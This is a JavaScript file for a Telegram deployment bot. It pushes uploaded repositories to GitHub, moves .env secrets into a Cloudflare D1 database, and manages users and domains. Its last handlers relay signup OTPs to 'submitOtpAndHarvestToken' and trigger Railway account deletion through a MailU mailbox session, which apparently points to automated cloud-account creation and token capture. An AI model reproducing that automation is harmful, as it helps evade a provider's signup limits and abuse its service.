                `🔐 *Securing Environment Secrets in Cloudflare D1...*\n` +
                `Found *${envKeys.length}* variables.\n` +
                '`[████░░░░░░]` *40%*', {
                chat_id: chat,
                message_id: progressMsg.message_id,
                parse_mode: 'Markdown'
            }).catch(() => {});

            envSavedCount = await saveD1RepoEnvs(repoName, allEnvs);
            await saveD1RepoDeployment(repoName, 'PENDING', resolvedUserId);
        } else {
            await saveD1RepoDeployment(repoName, 'PENDING', resolvedUserId);
        }

        // Step 2: Push Sanitized Codebase to GitHub
        await bot.editMessageText(
            `🚀 *Pushing Sanitized Codebase to GitHub...*\n` +
            `Target Repository: \`${repoName}\` (${staging.files.length} clean files)\n` +
            '`[████████░░]` *80%*', {
            chat_id: chat,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown'
        }).catch(() => {});

        const pushResult = await pushFilesToGitHub(repoName, staging.files, `Multiverse Deploy App: ${repoName} [skip ci]`);

        // Step 3: Send Final Success Card
        let envStatusText = 'No secrets required';
        if (envSavedCount > 0) {
            envStatusText = `✅ *${envSavedCount}* variables securely stored in Cloudflare D1 (\`repo_envs\`)`;
        }

        let strippedNotice = '';
        if (staging.strippedEnvFiles && staging.strippedEnvFiles.length > 0) {
            strippedNotice = `\n🛡️ *Purged Sensitive Files:* \`${staging.strippedEnvFiles.map(s => s.path).join(', ')}\``;
        }

        const successText = 
            `🎉 *Deployment Succeeded!*\n\n` +
            `📁 *Repository:* [${pushResult.owner}/${repoName}](${pushResult.repoUrl})\n` +
            `🌐 *Branch:* \`${pushResult.branch}\`\n` +
            `💾 *Commit:* \`${pushResult.commitSha}\`\n` +
            `📦 *Files Committed:* ${pushResult.filesCount}\n` +
            `🔐 *Environment:* ${envStatusText}${strippedNotice}\n\n` +
            `✨ *Status:* Successfully saved into directory & pushed to GitHub.`;

        await bot.editMessageText(successText, {
            chat_id: chat,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📁 Manage This Repo', callback_data: `repo_view_${repoName}` }],
                    [{ text: '🔗 Open GitHub Repository', url: pushResult.repoUrl }],
                    [{ text: '🚀 Deploy Another App', callback_data: 'action_deploy_app' }],
                    [{ text: '🔙 Main Menu', callback_data: 'menu_main' }]
                ]
            }
        }).catch(async () => {
            await bot.sendMessage(chat, successText, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            }).catch(() => {});
        });

    } catch (err) {
        console.error('Deployment Pipeline Error:', err);
        await bot.editMessageText(`❌ *Deployment Pipeline Failed:*\n\n\`${err.message}\`\n\nPlease check your repository archive or GitHub permissions and try again.`, {
            chat_id: chat,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Retry Deploy App', callback_data: 'action_deploy_app' }],
                    [{ text: '🔙 Main Menu', callback_data: 'menu_main' }]
                ]
            }
        }).catch(() => {});
    } finally {
        session.state = 'IDLE';
        session.deployStaging = null;
        session.targetUpdateRepo = null;
    }
}

// ----------------------------------------------------
// Incoming Text Messages Handler
// ----------------------------------------------------
bot.on('message', async (msg) => {
    const chat = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text ? msg.text.trim() : '';
    const session = getSession(chat);

    // Ignore commands
    if (text.startsWith('/')) return;

    // ----------------------------------------------------
    // Document Uploads (ZIP Repositories & .env Files)
    // ----------------------------------------------------
    if (msg.document) {
        const doc = msg.document;
        const fileName = doc.file_name || 'archive.zip';

        // 1. Merged Deployment Flow
        if (session.state === 'WAITING_REPO_MERGED') {
            if (!fileName.toLowerCase().endsWith('.zip')) {
                await bot.sendMessage(chat, '⚠️ Please upload a valid `.zip` repository archive file.');
                return;
            }

            const waitMsg = await bot.sendMessage(chat, '📥 *Downloading and analyzing repository archive...*', { parse_mode: 'Markdown' });
            try {
                const zipBuffer = await downloadTelegramFileBuffer(bot, doc.file_id);
                const processed = extractAndPurgeRepoZip(zipBuffer, fileName);
                session.deployStaging = processed;

                await bot.deleteMessage(chat, waitMsg.message_id).catch(() => {});
                await executeDeployPush(chat, session, {}, null, userId);
            } catch (err) {
                console.error('[Merged Flow Error]:', err);
                await bot.editMessageText(`❌ Failed to process archive: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
                session.state = 'IDLE';
                session.deployStaging = null;
            }
            return;
        }

        // 1b. Merged Repo Update Flow
        if (session.state === 'WAITING_REPO_UPDATE_MERGED') {
            if (!fileName.toLowerCase().endsWith('.zip')) {
                await bot.sendMessage(chat, '⚠️ Please upload a valid `.zip` repository archive file.');
                return;
            }
            const targetRepo = session.targetUpdateRepo;
            const waitMsg = await bot.sendMessage(chat, `📥 *Downloading and analyzing update archive for \`${targetRepo}\`...*`, { parse_mode: 'Markdown' });
            try {
                const zipBuffer = await downloadTelegramFileBuffer(bot, doc.file_id);
                const processed = extractAndPurgeRepoZip(zipBuffer, targetRepo);
                session.deployStaging = processed;

                await bot.deleteMessage(chat, waitMsg.message_id).catch(() => {});
                await executeDeployPush(chat, session, {}, targetRepo, userId);
            } catch (err) {
                console.error('[Update Merged Flow Error]:', err);
                await bot.editMessageText(`❌ Failed to process update archive: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
                session.state = 'IDLE';
                session.deployStaging = null;
                session.targetUpdateRepo = null;
            }
            return;
        }

        // 2. Separated Deployment Flow (Step 1: Repo Upload)
        if (session.state === 'WAITING_REPO_SEP') {
            if (!fileName.toLowerCase().endsWith('.zip')) {
                await bot.sendMessage(chat, '⚠️ Please upload a valid `.zip` repository archive file or send a GitHub URL.');
                return;
            }

            const waitMsg = await bot.sendMessage(chat, '📥 *Downloading and analyzing repository archive...*', { parse_mode: 'Markdown' });
            try {
                const zipBuffer = await downloadTelegramFileBuffer(bot, doc.file_id);
                const processed = extractAndPurgeRepoZip(zipBuffer, fileName);
                session.deployStaging = processed;
                session.state = 'WAITING_ENV_SEP';

                let envNote = '';
                if (processed.strippedEnvFiles.length > 0) {
                    envNote = `\n\n🛡️ *Security Shield:* Found and extracted \`${processed.strippedEnvFiles.map(s => s.path).join(', ')}\` (${Object.keys(processed.extractedEnvs).length} variables saved to Cloudflare D1 staging).`;
                }

                await bot.editMessageText(
                    `📑 *Separated Deployment (Step 2 of 2)*\n\n` +
                    `Repository received: *${processed.repoName}* (${processed.totalFiles} files).${envNote}\n\n` +
                    `Now please provide your \`.env\` configuration:\n` +
                    `• Send your \`.env\` content directly as a text message, OR\n` +
                    `• Upload a \`.env\` file document.\n\n` +
                    `*(Or click "⏩ Skip .env" if this app requires no environment variables)*`,
                    {
                        chat_id: chat,
                        message_id: waitMsg.message_id,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '⏩ Skip .env', callback_data: 'deploy_skip_env_sep' }],
                                [{ text: '🔙 Cancel', callback_data: 'action_deploy_app' }]
                            ]
                        }
                    }
                ).catch(() => {});
            } catch (err) {
                console.error('[Separated Flow Error]:', err);
                await bot.editMessageText(`❌ Failed to process archive: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
                session.state = 'IDLE';
                session.deployStaging = null;
            }
            return;
        }

        // 2b. Separated Repo Update Flow (Step 1)
        if (session.state === 'WAITING_REPO_UPDATE_SEP') {
            if (!fileName.toLowerCase().endsWith('.zip')) {
                await bot.sendMessage(chat, '⚠️ Please upload a valid `.zip` repository archive file or send a GitHub URL.');
                return;
            }
            const targetRepo = session.targetUpdateRepo;
            const waitMsg = await bot.sendMessage(chat, `📥 *Downloading and analyzing update archive for \`${targetRepo}\`...*`, { parse_mode: 'Markdown' });
            try {
                const zipBuffer = await downloadTelegramFileBuffer(bot, doc.file_id);
                const processed = extractAndPurgeRepoZip(zipBuffer, targetRepo);
                session.deployStaging = processed;
                session.state = 'WAITING_ENV_SEP';

                let envNote = '';
                if (processed.strippedEnvFiles.length > 0) {
                    envNote = `\n\n🛡️ *Security Shield:* Found and extracted \`${processed.strippedEnvFiles.map(s => s.path).join(', ')}\` (${Object.keys(processed.extractedEnvs).length} variables saved to Cloudflare D1 staging).`;
                }

                await bot.editMessageText(
                    `📑 *Separated Codebase Update for \`${targetRepo}\` (Step 2 of 2)*\n\n` +
                    `Repository update received: *${targetRepo}* (${processed.totalFiles} files).${envNote}\n\n` +
                    `Now please provide your updated \`.env\` configuration:\n` +
                    `• Send your \`.env\` content directly as a text message, OR\n` +
                    `• Upload a \`.env\` file document.\n\n` +
                    `*(Or click "⏩ Skip .env" to keep existing or skip)*`,
                    {
                        chat_id: chat,
                        message_id: waitMsg.message_id,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '⏩ Skip .env', callback_data: 'deploy_skip_env_sep' }],
                                [{ text: '🔙 Cancel', callback_data: `repo_view_${targetRepo}` }]
                            ]
                        }
                    }
                ).catch(() => {});
            } catch (err) {
                console.error('[Update Separated Flow Error]:', err);
                await bot.editMessageText(`❌ Failed to process update archive: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
                session.state = 'IDLE';
                session.deployStaging = null;
                session.targetUpdateRepo = null;
            }
            return;
        }

        // 3. Separated Deployment Flow (Step 2: .env File Upload)
        if (session.state === 'WAITING_ENV_SEP') {
            const waitMsg = await bot.sendMessage(chat, '📥 *Processing .env file...*', { parse_mode: 'Markdown' });
            try {
                const envBuffer = await downloadTelegramFileBuffer(bot, doc.file_id);
                const textContent = envBuffer.toString('utf8');
                const envMap = parseEnvContent(textContent);

                await bot.deleteMessage(chat, waitMsg.message_id).catch(() => {});
                await executeDeployPush(chat, session, envMap, session.targetUpdateRepo, userId);
            } catch (err) {
                console.error('[Env File Error]:', err);
                await bot.editMessageText(`❌ Failed to read .env file: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
            }
            return;
        }

        // 4. Standalone Environment Update Upload
        if (session.state === 'WAITING_ENV_UPDATE') {
            const targetRepo = session.targetRepo;
            const waitMsg = await bot.sendMessage(chat, '📥 *Processing .env file...*', { parse_mode: 'Markdown' });
            try {
                const envBuffer = await downloadTelegramFileBuffer(bot, doc.file_id);
                const textContent = envBuffer.toString('utf8');
                const envMap = parseEnvContent(textContent);
                const count = await saveD1RepoEnvs(targetRepo, envMap);
                await bot.editMessageText(`✅ Successfully stored *${count}* environment variables for \`${targetRepo}\` in Cloudflare D1 (\`repo_envs\`).`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id,
                    parse_mode: 'Markdown'
                }).catch(() => {});
                session.state = 'IDLE';
                session.targetRepo = null;
                await showRepoEnvMenu(chat, null, targetRepo);
            } catch (err) {
                await bot.editMessageText(`❌ Failed to update .env: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
                session.state = 'IDLE';
            }
            return;
        }
    }

    // ----------------------------------------------------
    // Text Inputs for Deploy App
    // ----------------------------------------------------
    if (session.state === 'WAITING_REPO_SEP' || session.state === 'WAITING_REPO_UPDATE_SEP') {
        const isUpdate = session.state === 'WAITING_REPO_UPDATE_SEP';
        const targetRepoHint = isUpdate ? session.targetUpdateRepo : '';

        if (text.includes('github.com')) {
            const waitMsg = await bot.sendMessage(chat, '📥 *Fetching repository from GitHub...*', { parse_mode: 'Markdown' });
            try {
                const { buffer, repoName } = await downloadGitHubRepoZip(text);
                const finalRepoName = targetRepoHint || repoName;
                const processed = extractAndPurgeRepoZip(buffer, finalRepoName);
                session.deployStaging = processed;
                session.state = 'WAITING_ENV_SEP';

                let envNote = '';
                if (processed.strippedEnvFiles.length > 0) {
                    envNote = `\n\n🛡️ *Security Shield:* Found and extracted \`${processed.strippedEnvFiles.map(s => s.path).join(', ')}\` (${Object.keys(processed.extractedEnvs).length} variables saved to Cloudflare D1 staging).`;
                }

                await bot.editMessageText(
                    `📑 *Separated Deployment (Step 2 of 2)*\n\n` +
                    `Repository ${isUpdate ? 'update ' : ''}fetched: *${processed.repoName}* (${processed.totalFiles} files).${envNote}\n\n` +
                    `Now please provide your \`.env\` configuration:\n` +
                    `• Send your \`.env\` content directly as a text message, OR\n` +
                    `• Upload a \`.env\` file document.\n\n` +
                    `*(Or click "⏩ Skip .env" ${isUpdate ? 'to keep existing or skip' : 'if this app requires no environment variables'})*`,
                    {
                        chat_id: chat,
                        message_id: waitMsg.message_id,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '⏩ Skip .env', callback_data: 'deploy_skip_env_sep' }],
                                [{ text: '🔙 Cancel', callback_data: isUpdate ? `repo_view_${finalRepoName}` : 'action_deploy_app' }]
                            ]
                        }
                    }
                ).catch(() => {});
            } catch (err) {
                console.error('[GitHub Link Fetch Error]:', err);
                await bot.editMessageText(`❌ Failed to fetch GitHub repository: ${err.message}`, {
                    chat_id: chat,
                    message_id: waitMsg.message_id
                }).catch(() => {});
            }
            return;
        } else {
            await bot.sendMessage(chat, '⚠️ Please upload a `.zip` file document or send a valid public GitHub URL (e.g. `https://github.com/user/my-repo`).');
            return;
        }
    }

    if (session.state === 'WAITING_ENV_SEP') {
        if (text.includes('=')) {
            const envMap = parseEnvContent(text);
            await executeDeployPush(chat, session, envMap, session.targetUpdateRepo, userId);
            return;
        } else {
            await bot.sendMessage(chat, '⚠️ Please send valid `.env` variables with `KEY=VALUE` pairs, or click "⏩ Skip .env".');
            return;
        }
    }

    if (session.state === 'WAITING_ENV_UPDATE') {
        if (text.includes('=')) {
            const targetRepo = session.targetRepo;
            const envMap = parseEnvContent(text);
            const count = await saveD1RepoEnvs(targetRepo, envMap);
            await bot.sendMessage(chat, `✅ Successfully stored *${count}* environment variables for \`${targetRepo}\` in Cloudflare D1 (\`repo_envs\`).`, { parse_mode: 'Markdown' });
            session.state = 'IDLE';
            session.targetRepo = null;
            await showRepoEnvMenu(chat, null, targetRepo);
            return;
        } else {
            await bot.sendMessage(chat, '⚠️ Please send valid `.env` variables with `KEY=VALUE` pairs (e.g. `PORT=3000`).');
            return;
        }
    }

    // Handle Adding Authorized User (from Setup)
    if (session.state === 'WAITING_NEW_USER_SETUP') {
        if (!isOwner(userId)) {
            session.state = 'IDLE';
            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }

        const formattedUser = addAuthorizedUser(text);
        if (!formattedUser) {
            await bot.sendMessage(chat, '⚠️ Invalid username or ID. Please send a valid Telegram username like `@username` or numeric User ID.');
            return;
        }

        session.state = 'IDLE';
        const menu = getSetupMenu();
        await bot.sendMessage(chat, `✅ User \`${formattedUser}\` authorized successfully! They can now use Auto Build.\n\n${menu.text}`, menu.opts);
        return;
    }

    // Handle Adding New Domain (from Auto Build or Setup)
    if (session.state === 'WAITING_NEW_DOMAIN_AB' || session.state === 'WAITING_NEW_DOMAIN_SETUP') {
        if (!isOwner(userId)) {
            session.state = 'IDLE';
            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }

        const isFromSetup = session.state === 'WAITING_NEW_DOMAIN_SETUP';
        const cleanDomain = addDomainToConfig(text);

        if (!cleanDomain) {
            await bot.sendMessage(chat, '⚠️ Invalid domain format. Please send a valid domain name like `domain.shop` or `cloud.xyz`.');
            return;
        }

        session.state = 'IDLE';
        if (isFromSetup) {
            const menu = getSetupMenu();
            await bot.sendMessage(chat, `✅ Domain \`${cleanDomain}\` added successfully!\n\n${menu.text}`, menu.opts);
        } else {
            await bot.sendMessage(chat, `✅ Domain \`${cleanDomain}\` added successfully! Select a domain:`, {
                parse_mode: 'Markdown',
                ...getAutoBuildMenu(isOwner(userId))
            });
        }
        return;
    }

    // Handle Delete Railway Account by Email input
    if (session.state === 'WAITING_DELETE_ACCOUNT_EMAIL') {
        const emailToDelete = text.trim();
        if (!emailToDelete.includes('@')) {
            await bot.sendMessage(chat, '⚠️ Please send a valid email address.');
            return;
        }
        session.state = 'IDLE';
        await triggerAutonomousDeletionForChat(chat, emailToDelete);
        return;
    }

    // Handle Deletion OTP input (when MailU session has expired)
    if (session.state === 'WAITING_DELETE_OTP') {
        const otp = text.replace(/\s/g, '');
        if (/^\d{6}$/.test(otp)) {
            session.state = 'IDLE';
            if (typeof session.pendingDeleteResolve === 'function') {
                session.pendingDeleteResolve(otp);
                session.pendingDeleteResolve = null;
                await bot.sendMessage(chat, '🔑 OTP received! Proceeding with deletion on Railway...').catch(() => {});
            }
        } else {
            await bot.sendMessage(chat, '⚠️ Please send a valid 6-digit code (numbers only).');
        }
        return;
    }

    // Handle Custom Email input
    if (text.includes('@') && session.state === 'WAITING_EMAIL') {
        session.state = 'IDLE';
        startInactivityTimer(chat);
        const statusMsg = await bot.sendMessage(chat, '⚡ *Server Creating...*\n`────────────` *0%*', { parse_mode: 'Markdown' });
        await processEmailAndRequestOTP(chat, statusMsg.message_id, text.trim());
        return;
    }

    // Handle OTP input
    if (session.state === 'WAITING_OTP') {
        const otp = text.replace(/\s/g, '');
        if (/^\d{6}$/.test(otp)) {
            const otpStatusMsg = await bot.sendMessage(chat, '⚡ *Server Creating...*\n`━━━━━━━━╸───` *70%*', { parse_mode: 'Markdown' });
            await submitOtpAndHarvestToken(chat, otpStatusMsg.message_id, otp);
        } else {
            await bot.sendMessage(chat, '⚠️ Send a valid 6-digit code (numbers only).');
        }
    }
});
